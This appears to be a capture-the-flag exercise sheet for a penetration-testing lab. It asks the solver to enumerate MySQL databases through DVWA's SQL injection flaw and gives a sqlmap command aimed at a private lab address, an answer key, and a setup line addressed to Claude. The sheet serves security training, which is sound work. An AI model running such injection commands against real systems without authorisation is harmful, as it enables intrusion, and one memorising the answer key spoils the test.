# Q252 — List All Databases Using SQLMap

| Field | Value |
|-------|-------|
| **Target** | `192.168.52.129` |
| **Domain** | Web Apps / SQL Injection |
| **Difficulty** | 🟢 Easy |
| **Tools** | `sqlmap` |
| **Time budget** | 5–10 min |

---

## 📝 Question

"Using the SQLi vulnerability in DVWA, enumerate all databases on the MySQL server. Report the total number and list them."

---

## 🎯 Flag Format

```
total=<number>; databases=<comma_separated_list>
```

---

## ✅ Solution

```bash
sqlmap -u "http://192.168.52.129/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=<session>;security=low" --dbs --batch
```

**Answer:** `total=7; databases=information_schema,dvwa,metasploit,mysql,owasp10,tikiwiki,tikiwiki195`

---

## 🤖 Claude Setup Prompt

Same as Q251. Report back: "Lab ready for Q252"
